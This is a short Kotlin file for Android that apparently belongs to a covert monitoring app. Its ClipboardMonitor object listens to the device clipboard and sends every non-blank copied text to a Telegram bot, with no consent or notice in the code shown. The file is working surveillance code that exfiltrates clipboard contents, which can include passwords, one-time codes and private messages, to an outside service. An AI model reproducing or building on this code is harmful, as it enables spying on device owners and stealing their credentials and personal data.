package com.dec.monitor.input

import android.content.ClipboardManager
import android.content.Context
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

object ClipboardMonitor {

    fun start(context: Context) {
        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboard.addPrimaryClipChangedListener {
            val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: return@addPrimaryClipChangedListener
            if (text.isBlank()) return@addPrimaryClipChangedListener
            CoroutineScope(Dispatchers.IO).launch {
                TelegramBot.sendMessage("📋 <b>Clipboard</b>\n$text")
            }
        }
    }
}
